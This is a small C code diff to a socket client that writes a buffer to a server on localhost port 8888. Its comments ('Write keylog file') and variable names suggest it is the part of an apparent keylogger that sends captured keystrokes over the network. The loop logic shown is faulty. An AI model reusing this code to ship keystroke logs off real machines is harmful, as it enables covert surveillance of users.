@@ -10,7 +10,7 @@ void run_client(void)
     struct sockaddr_in server;
     char send_buffer[2000];
     
-    char *addr = "127.0.0.1";
+    char *addr = "127.0.0.1";  // localhost
     short port = 8888;
     
     // Create a socket. Return value is a file descriptor for the socket.
@@ -53,7 +53,7 @@ void run_client(void)
     /*Open network_log file for writing*/
     FILE *network_log = fopen("log/network.txt", "a");
     /*Write keylog file*/
-    while(!feof(keylog_log))
+    while(!feof(network_log))
     {
         if ((ret = write(sock, send_buffer, strlen(send_buffer))) <= 0) {
             perror("Error writing network log\n");
